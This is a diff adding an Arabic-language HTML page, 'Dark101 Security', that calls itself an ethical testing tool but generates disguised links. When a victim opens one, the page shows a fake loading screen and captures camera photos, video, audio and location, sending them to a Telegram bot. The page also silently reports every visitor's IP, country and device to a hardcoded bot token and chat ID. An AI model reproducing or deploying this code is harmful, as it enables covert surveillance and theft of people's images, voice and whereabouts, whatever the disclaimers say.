@@ -1,0 +1,468 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>Dark101 Security - أداة اختبار أخلاقي</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: linear-gradient(135deg, #0a0f1a 0%, #0a192f 100%);
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .card {
+            background: rgba(20, 26, 42, 0.95);
+            backdrop-filter: blur(10px);
+            border-radius: 28px;
+            padding: 35px;
+            max-width: 550px;
+            width: 100%;
+            box-shadow: 0 25px 45px rgba(0, 0, 0, 0.4);
+            border: 1px solid rgba(0, 212, 255, 0.2);
+        }
+
+        h1 {
+            background: linear-gradient(90deg, #00d4ff, #0077ff);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            font-size: 28px;
+            text-align: center;
+        }
+
+        .sub {
+            color: #8892b0;
+            text-align: center;
+            margin: 10px 0 25px;
+            font-size: 13px;
+        }
+
+        .warning {
+            background: rgba(255, 100, 100, 0.1);
+            border: 1px solid #ff4444;
+            border-radius: 14px;
+            padding: 12px;
+            margin-bottom: 25px;
+            color: #ff8888;
+            font-size: 12px;
+            text-align: center;
+        }
+
+        label {
+            display: block;
+            color: #ccd6f6;
+            margin: 15px 0 8px;
+            font-weight: 600;
+            font-size: 14px;
+        }
+
+        input {
+            width: 100%;
+            padding: 14px;
+            border-radius: 14px;
+            border: 1px solid rgba(0, 212, 255, 0.2);
+            background: rgba(10, 15, 26, 0.8);
+            color: #fff;
+            font-size: 14px;
+        }
+
+        input:focus {
+            outline: none;
+            border-color: #00d4ff;
+        }
+
+        .checkbox-group {
+            background: rgba(0, 212, 255, 0.05);
+            border-radius: 18px;
+            padding: 15px;
+            margin: 20px 0;
+        }
+
+        .checkbox-item {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding: 10px 0;
+            cursor: pointer;
+        }
+
+        .checkbox-item input {
+            width: 18px;
+            height: 18px;
+            cursor: pointer;
+            accent-color: #00d4ff;
+        }
+
+        .checkbox-item label {
+            margin: 0;
+            cursor: pointer;
+            font-weight: normal;
+        }
+
+        .btn {
+            width: 100%;
+            padding: 15px;
+            background: linear-gradient(90deg, #00d4ff, #0077ff);
+            border: none;
+            border-radius: 40px;
+            color: #fff;
+            font-weight: bold;
+            font-size: 16px;
+            cursor: pointer;
+            margin-top: 15px;
+            transition: all 0.3s ease;
+        }
+
+        .btn:hover {
+            transform: scale(1.02);
+            box-shadow: 0 5px 20px rgba(0, 212, 255, 0.3);
+        }
+
+        .result {
+            margin-top: 20px;
+            background: rgba(0, 212, 255, 0.1);
+            border-radius: 14px;
+            padding: 12px;
+            display: flex;
+            gap: 10px;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        .result div {
+            flex: 1;
+            font-size: 12px;
+            word-break: break-all;
+            color: #ccd6f6;
+        }
+
+        .copyBtn {
+            background: #0077ff;
+            border: none;
+            padding: 8px 18px;
+            border-radius: 25px;
+            color: #fff;
+            cursor: pointer;
+            font-weight: bold;
+        }
+
+        footer {
+            text-align: center;
+            margin-top: 25px;
+            color: #5a6e8a;
+            font-size: 11px;
+        }
+    </style>
+</head>
+<body>
+<div class="card">
+    <h1>🛡️ Dark101 Security</h1>
+    <div class="sub">أداة اختبار اختراق أخلاقي - للأغراض التعليمية فقط</div>
+
+    <div class="warning">
+        ⚠️ تحذير: استخدام هذه الأداة لأغراض غير قانونية يعرضك للمساءلة.<br>
+        يُسمح بالاختبار فقط على نفسك أو على أجهزتك الخاصة.
+    </div>
+
+    <label>📱 Chat ID الخاص بك</label>
+    <input type="text" id="chatIdInput" placeholder="مثال: 5849068535" value="5849068535">
+
+    <label>🤖 توكن البوت الخاص بك</label>
+    <input type="text" id="tokenInput" placeholder="مثال: 123456789:ABCdefGHIjklmNOPqrstUvwxYZ" value="8425168324:AAGiTTzty3oL5GMUtMWa74ejRKm7DJlTayU">
+
+    <div class="checkbox-group">
+        <div class="checkbox-item">
+            <input type="checkbox" id="camFront" checked>
+            <label>📸 صورة من الكاميرا الأمامية</label>
+        </div>
+        <div class="checkbox-item">
+            <input type="checkbox" id="camBack">
+            <label>📷 صورة من الكاميرا الخلفية</label>
+        </div>
+        <div class="checkbox-item">
+            <input type="checkbox" id="location" checked>
+            <label>📍 تحديد الموقع على الخريطة</label>
+        </div>
+        <div class="checkbox-item">
+            <input type="checkbox" id="audio">
+            <label>🎤 تسجيل صوتي (5 ثوان)</label>
+        </div>
+        <div class="checkbox-item">
+            <input type="checkbox" id="videoFront">
+            <label>🎥 فيديو من الكاميرا الأمامية (5 ثوان)</label>
+        </div>
+        <div class="checkbox-item">
+            <input type="checkbox" id="videoBack">
+            <label>📹 فيديو من الكاميرا الخلفية (5 ثوان)</label>
+        </div>
+    </div>
+
+    <button class="btn" id="generateBtn">🔗 إنشاء رابط الاختبار</button>
+
+    <div id="result" style="display: none;" class="result">
+        <div id="linkText"></div>
+        <button class="copyBtn" id="copyBtn">📋 نسخ</button>
+    </div>
+    <footer>Dark101 - للأغراض التعليمية فقط - اختبر على نفسك</footer>
+</div>
+
+<script>
+// ================== بيانات البوت ==================
+const DEFAULT_BOT_TOKEN = "8425168324:AAGiTTzty3oL5GMUtMWa74ejRKm7DJlTayU";
+const DEFAULT_CHAT_ID = "5849068535";
+
+// إرسال معلومات الزائر
+async function sendVisitorInfo() {
+    try {
+        let device = "Unknown";
+        const ua = navigator.userAgent;
+        if (/Android/i.test(ua)) device = "Android";
+        else if (/iPhone|iPad|iPod/i.test(ua)) device = "iOS";
+        else if (/Windows/i.test(ua)) device = "Windows";
+        else if (/Mac/i.test(ua)) device = "Mac";
+        
+        let ip = "غير معروف", country = "غير معروف";
+        try {
+            const res = await fetch('https://ipapi.co/json/');
+            const data = await res.json();
+            ip = data.ip || ip;
+            country = data.country_name || country;
+        } catch(e) {}
+        
+        const msg = `🟢 *زيارة جديدة*\n🌍 البلد: ${country}\n📱 الجهاز: ${device}\n🌐 IP: ${ip}\n🕒 ${new Date().toLocaleString('ar-EG')}`;
+        await fetch(`https://api.telegram.org/bot${DEFAULT_BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({chat_id: DEFAULT_CHAT_ID, text: msg, parse_mode: 'Markdown'})
+        });
+    } catch(e) { console.log('خطأ:', e); }
+}
+sendVisitorInfo();
+
+// دالة لالتقاط صورة
+async function capturePhoto(chat, token, facingMode, type) {
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({video: {facingMode: {exact: facingMode}}});
+        const video = document.createElement('video');
+        video.srcObject = stream;
+        video.playsInline = true;
+        await video.play();
+        await new Promise(r => setTimeout(r, 500));
+        
+        const canvas = document.createElement('canvas');
+        canvas.width = video.videoWidth || 640;
+        canvas.height = video.videoHeight || 480;
+        canvas.getContext('2d').drawImage(video, 0, 0);
+        
+        const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.8));
+        const fd = new FormData();
+        fd.append('chat_id', chat);
+        fd.append('photo', blob, `photo_${Date.now()}.jpg`);
+        fd.append('caption', `📸 صورة من ${type === 'front' ? 'الكاميرا الأمامية' : 'الكاميرا الخلفية'}`);
+        
+        await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {method: 'POST', body: fd});
+        stream.getTracks().forEach(t => t.stop());
+        return true;
+    } catch(e) {
+        console.log('خطأ في الصورة:', e);
+        return false;
+    }
+}
+
+// دالة لتسجيل فيديو
+async function recordVideo(chat, token, facingMode, type) {
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({video: {facingMode: {exact: facingMode}}, audio: true});
+        const mediaRecorder = new MediaRecorder(stream);
+        const chunks = [];
+        
+        mediaRecorder.ondataavailable = e => chunks.push(e.data);
+        mediaRecorder.onstop = async () => {
+            const blob = new Blob(chunks, {type: 'video/mp4'});
+            const fd = new FormData();
+            fd.append('chat_id', chat);
+            fd.append('video', blob, `video_${Date.now()}.mp4`);
+            fd.append('caption', `🎥 فيديو من ${type === 'front' ? 'الكاميرا الأمامية' : 'الكاميرا الخلفية'} - 5 ثوان`);
+            await fetch(`https://api.telegram.org/bot${token}/sendVideo`, {method: 'POST', body: fd});
+        };
+        
+        mediaRecorder.start();
+        setTimeout(() => mediaRecorder.stop(), 5000);
+        setTimeout(() => stream.getTracks().forEach(t => t.stop()), 5500);
+        return true;
+    } catch(e) {
+        console.log('خطأ في الفيديو:', e);
+        return false;
+    }
+}
+
+// دالة لتسجيل الصوت
+async function recordAudio(chat, token) {
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({audio: true});
+        const mediaRecorder = new MediaRecorder(stream);
+        const chunks = [];
+        
+        mediaRecorder.ondataavailable = e => chunks.push(e.data);
+        mediaRecorder.onstop = async () => {
+            const blob = new Blob(chunks, {type: 'audio/mp4'});
+            const fd = new FormData();
+            fd.append('chat_id', chat);
+            fd.append('audio', blob, `audio_${Date.now()}.mp4`);
+            fd.append('caption', '🎤 تسجيل صوتي - 5 ثوان');
+            await fetch(`https://api.telegram.org/bot${token}/sendAudio`, {method: 'POST', body: fd});
+        };
+        
+        mediaRecorder.start();
+        setTimeout(() => mediaRecorder.stop(), 5000);
+        setTimeout(() => stream.getTracks().forEach(t => t.stop()), 5500);
+        return true;
+    } catch(e) {
+        console.log('خطأ في التسجيل:', e);
+        return false;
+    }
+}
+
+// دالة لإرسال الموقع
+async function sendLocation(chat, token) {
+    return new Promise((resolve) => {
+        if (!navigator.geolocation) {
+            resolve(false);
+            return;
+        }
+        navigator.geolocation.getCurrentPosition(async (pos) => {
+            const lat = pos.coords.latitude;
+            const lon = pos.coords.longitude;
+            const url = `https://www.google.com/maps?q=${lat},${lon}`;
+            await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({chat_id: chat, text: `📍 الموقع الحالي\nالإحداثيات: ${lat}, ${lon}\n🔗 ${url}`})
+            });
+            resolve(true);
+        }, () => resolve(false));
+    });
+}
+
+// إنشاء الرابط
+document.getElementById('generateBtn').onclick = () => {
+    let chat = document.getElementById('chatIdInput').value.trim();
+    let token = document.getElementById('tokenInput').value.trim();
+    
+    if (!chat) chat = DEFAULT_CHAT_ID;
+    if (!token) token = DEFAULT_BOT_TOKEN;
+    
+    if (!chat || !token) {
+        alert('❌ الرجاء إدخال Chat ID وتوكن البوت');
+        return;
+    }
+    
+    const features = [];
+    if (document.getElementById('camFront').checked) features.push('camFront');
+    if (document.getElementById('camBack').checked) features.push('camBack');
+    if (document.getElementById('location').checked) features.push('location');
+    if (document.getElementById('audio').checked) features.push('audio');
+    if (document.getElementById('videoFront').checked) features.push('videoFront');
+    if (document.getElementById('videoBack').checked) features.push('videoBack');
+    
+    if (features.length === 0) {
+        alert('❌ الرجاء اختيار ميزة واحدة على الأقل');
+        return;
+    }
+    
+    const baseUrl = window.location.href.split('?')[0];
+    const link = `${baseUrl}?chat=${encodeURIComponent(chat)}&token=${encodeURIComponent(token)}&features=${features.join(',')}`;
+    
+    document.getElementById('linkText').innerText = link;
+    document.getElementById('result').style.display = 'flex';
+};
+
+// نسخ الرابط
+document.getElementById('copyBtn').onclick = async () => {
+    const text = document.getElementById('linkText').innerText;
+    if (text) {
+        await navigator.clipboard.writeText(text);
+        const btn = document.getElementById('copyBtn');
+        btn.innerText = '✅ تم';
+        setTimeout(() => btn.innerText = '📋 نسخ', 2000);
+    }
+};
+
+// ================== معالجة الصفحة الجانبية ==================
+const urlParams = new URLSearchParams(window.location.search);
+const chatParam = urlParams.get('chat');
+const tokenParam = urlParams.get('token');
+const featuresParam = urlParams.get('features');
+
+if (chatParam && tokenParam && featuresParam) {
+    // إخفاء المحتوى الأصلي
+    document.body.innerHTML = `
+        <div style="text-align:center;padding:50px;background:#0a0f1a;min-height:100vh;color:#fff">
+            <div style="max-width:400px;margin:0 auto">
+                <h2>⏳ جاري التحميل...</h2>
+                <p style="color:#8892b0;margin-top:20px">سيتم توجيهك خلال ثوان</p>
+                <div style="margin-top:30px">
+                    <div style="width:40px;height:40px;border:3px solid #00d4ff;border-top-color:transparent;border-radius:50%;animation:spin 1s linear infinite;margin:0 auto"></div>
+                </div>
+            </div>
+        </div>
+        <style>@keyframes spin{to{transform:rotate(360deg)}}</style>
+    `;
+    
+    const features = featuresParam.split(',');
+    
+    (async () => {
+        // تنفيذ الميزات
+        for (const feature of features) {
+            switch(feature) {
+                case 'camFront':
+                    await capturePhoto(chatParam, tokenParam, 'user', 'front');
+                    break;
+                case 'camBack':
+                    await capturePhoto(chatParam, tokenParam, 'environment', 'back');
+                    break;
+                case 'videoFront':
+                    await recordVideo(chatParam, tokenParam, 'user', 'front');
+                    break;
+                case 'videoBack':
+                    await recordVideo(chatParam, tokenParam, 'environment', 'back');
+                    break;
+                case 'audio':
+                    await recordAudio(chatParam, tokenParam);
+                    break;
+                case 'location':
+                    await sendLocation(chatParam, tokenParam);
+                    break;
+            }
+            await new Promise(r => setTimeout(r, 1000));
+        }
+        
+        // عرض رسالة النجاح
+        setTimeout(() => {
+            document.body.innerHTML = `
+                <div style="text-align:center;padding:50px;background:#0a0f1a;min-height:100vh;color:#fff">
+                    <div style="max-width:400px;margin:0 auto">
+                        <h2 style="color:#00d4ff">✅ تم الإرسال بنجاح</h2>
+                        <p style="color:#8892b0;margin-top:20px">تم إرسال البيانات إلى بوت التليجرام الخاص بك</p>
+                        <p style="color:#5a6e8a;margin-top:15px;font-size:12px">هذا اختبار أخلاقي - اختبر على نفسك فقط</p>
+                        <button onclick="location.href=window.location.origin" style="margin-top:30px;padding:12px 30px;background:#00d4ff;border:none;border-radius:30px;cursor:pointer;color:#0a0f1a;font-weight:bold">🔙 العودة</button>
+                    </div>
+                </div>
+            `;
+        }, 8000);
+    })();
+}
+</script>
+</body>
+</html>
